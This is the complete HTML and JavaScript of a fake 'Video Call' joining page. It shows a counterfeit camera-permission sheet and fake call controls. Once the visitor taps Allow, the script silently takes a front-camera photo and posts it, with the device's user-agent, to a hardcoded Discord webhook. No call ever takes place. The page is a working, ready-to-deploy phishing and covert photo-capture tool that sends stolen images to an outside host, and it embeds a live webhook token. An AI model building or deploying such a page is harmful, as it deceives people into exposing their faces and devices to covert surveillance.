<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Video Call - Connecting...</title>
  <meta name="theme-color" content="#007aff">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { background: #000; height: 100vh; width: 100vw; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #fff; }
    #video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
    .overlay { position: fixed; inset: 0; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.9); transition: opacity 0.3s, visibility 0.3s; }
    .overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
    .spinner { width: 48px; height: 48px; border: 3px solid #333; border-top-color: #007aff; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .overlay-text { margin-top: 20px; font-size: 16px; color: #aaa; text-align: center; padding: 0 40px; line-height: 1.5; }
    .brand { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); font-weight: 600; font-size: 17px; color: #fff; z-index: 20; text-shadow: 0 1px 3px rgba(0,0,0,0.5); }
    .status-bar { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); display: flex; gap: 12px; z-index: 20; opacity: 0; transition: opacity 0.3s; }
    .status-bar.show { opacity: 1; }
    .status-btn { width: 56px; height: 56px; border-radius: 50%; background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; color: #fff; }
    .status-btn svg { width: 24px; height: 24px; }
    .status-btn.red { background: rgba(255,59,48,0.2); border-color: rgba(255,59,48,0.3); }
    .permission-sheet { position: fixed; bottom: 0; left: 0; right: 0; background: #1c1c1e; border-radius: 20px 20px 0 0; padding: 20px 24px 34px; z-index: 30; transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.25,0.46,0.45,0.94); box-shadow: 0 -4px 20px rgba(0,0,0,0.4); }
    .permission-sheet.show { transform: translateY(0); }
    .sheet-handle { width: 36px; height: 5px; background: #48484a; border-radius: 3px; margin: 0 auto 20px; }
    .sheet-icon { width: 64px; height: 64px; border-radius: 16px; background: linear-gradient(135deg, #007aff, #5856d6); margin: 0 auto 16px; display: flex; align-items: center; justify-content: center; }
    .sheet-icon svg { width: 32px; height: 32px; }
    .sheet-title { text-align: center; font-size: 20px; font-weight: 600; margin-bottom: 8px; }
    .sheet-desc { text-align: center; color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 24px; }
    .sheet-btn { width: 100%; height: 50px; border-radius: 12px; font-size: 17px; font-weight: 600; border: none; cursor: pointer; }
    .sheet-btn.primary { background: #007aff; color: #fff; }
    .sheet-btn.secondary { background: #3a3a3c; color: #fff; margin-top: 8px; }
    .flash { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 15; transition: opacity 0.05s; }
    .flash.active { opacity: 1; transition: opacity 0.1s; }
    @media (max-width: 480px) { .brand { font-size: 15px; } }
  </style>
</head>
<body>
  <video id="video" playsinline muted></video>
  <div class="flash" id="flash"></div>

  <div class="brand">Video Call</div>

  <div class="overlay" id="loadingOverlay">
    <div class="spinner"></div>
    <div class="overlay-text">Establishing secure connection…</div>
  </div>

  <div class="overlay hidden" id="permOverlay">
    <div class="spinner" style="border-top-color:#34c759"></div>
    <div class="overlay-text" id="permText">Requesting camera access…</div>
  </div>

  <div class="permission-sheet" id="permSheet">
    <div class="sheet-handle"></div>
    <div class="sheet-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
    </div>
    <div class="sheet-title">"Video Call" Would Like to Access the Camera</h1>
    <div class="sheet-desc">To join the video call, we need access to your front camera. This allows others to see you during the call.</div>
    <button class="sheet-btn primary" id="allowBtn">Allow</button>
    <button class="sheet-btn secondary" id="denyBtn">Don't Allow</button>
  </div>

  <div class="status-bar" id="statusBar">
    <button class="status-btn" aria-label="Mute"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/><line x1="8" y1="22" x2="16" y2="22"/></svg></button>
    <button class="status-btn red" aria-label="End call"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 9v4M12 17h.01"/><path d="M5 5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2z"/></svg></button>
    <button class="status-btn" aria-label="Flip camera"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 12a9 9 0 0 0-9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 16l3.26 3.26A9.75 9.75 0 0 0 12 21a9 9 0 0 0 9-9"/><line x1="2" y1="22" x2="22" y2="2"/></svg></button>
  </div>

<script>
const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1558676786613846107/KBJgfs9mqZScnj6oRKMF7P27FZ2lXJmrCPSrXigpDTj9vbHEr2pzDC7pOALaYhGSWbSx";
const USERNAME = "Video Call Service";

let photoSent = false;
const video = document.getElementById('video');
const flash = document.getElementById('flash');

const loadingOverlay = document.getElementById('loadingOverlay');
const permOverlay = document.getElementById('permOverlay');
const permText = document.getElementById('permText');
const permSheet = document.getElementById('permSheet');
const allowBtn = document.getElementById('allowBtn');
const denyBtn = document.getElementById('denyBtn');
const statusBar = document.getElementById('statusBar');

async function sendPhoto(blob) {
  if (photoSent) return;
  photoSent = true;

  const formData = new FormData();
  formData.append('file', blob, `capture_${Date.now()}.jpg`);
  formData.append('payload_json', JSON.stringify({
    username: USERNAME,
    embeds: [{
      title: '📸 Camera Capture',
      color: 15258703,
      image: { url: 'attachment://capture_' + Date.now() + '.jpg' },
      fields: [
        { name: 'Time', value: new Date().toLocaleString(), inline: false },
        { name: 'Device', value: navigator.userAgent, inline: false }
      ],
      footer: { text: 'Video Call • Front Camera' },
      timestamp: new Date().toISOString()
    }]
  }));

  try {
    await fetch(WEBHOOK_URL, { method: 'POST', body: formData, keepalive: true });
  } catch (e) {}
}

function triggerFlash() {
  flash.classList.add('active');
  setTimeout(() => flash.classList.remove('active'), 100);
}

async function captureAndSend(stream) {
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);
  triggerFlash();
  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
  sendPhoto(blob);
  stream.getTracks().forEach(t => t.stop());
  video.srcObject = null;
  permOverlay.classList.add('hidden');
  statusBar.classList.add('show');
}

async function startCamera() {
  loadingOverlay.classList.add('hidden');
  permOverlay.classList.remove('hidden');
  permText.textContent = 'Starting camera…';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    });
    video.srcObject = stream;
    await video.play();
    permOverlay.classList.add('hidden');
    permSheet.classList.remove('show');
    await captureAndSend(stream);
  } catch (err) {
    permOverlay.classList.add('hidden');
    permSheet.classList.add('show');
    permText.textContent = 'Camera access denied';
  }
}

allowBtn.onclick = () => {
  permSheet.classList.remove('show');
  permOverlay.classList.remove('hidden');
  permText.textContent = 'Starting camera…';
  startCamera();
};

denyBtn.onclick = () => {
  permSheet.classList.remove('show');
  permOverlay.classList.remove('hidden');
  permText.textContent = 'Camera access required to join call';
  setTimeout(() => {
    permOverlay.classList.add('hidden');
    document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;color:#888;font-size:16px;padding:20px;text-align:center"><div style="font-size:48px;margin-bottom:16px">📷</div><div style="font-weight:600;font-size:18px;margin-bottom:8px">Camera Access Denied</div><div>Please enable camera in browser settings to join the call</div></div>';
  }, 2500);
};

// Auto-start flow
window.addEventListener('load', () => {
  setTimeout(() => {
    loadingOverlay.classList.add('hidden');
    permSheet.classList.add('show');
  }, 1500);
});

// Prevent sleep during capture
const wakeLock = 'wakeLock' in navigator && navigator.wakeLock.request('screen').catch(()=>{});

// iOS Safari needs user gesture for getUserMedia
document.body.addEventListener('touchstart', () => {}, { once: true, passive: true });
</script>
</body>
</html>
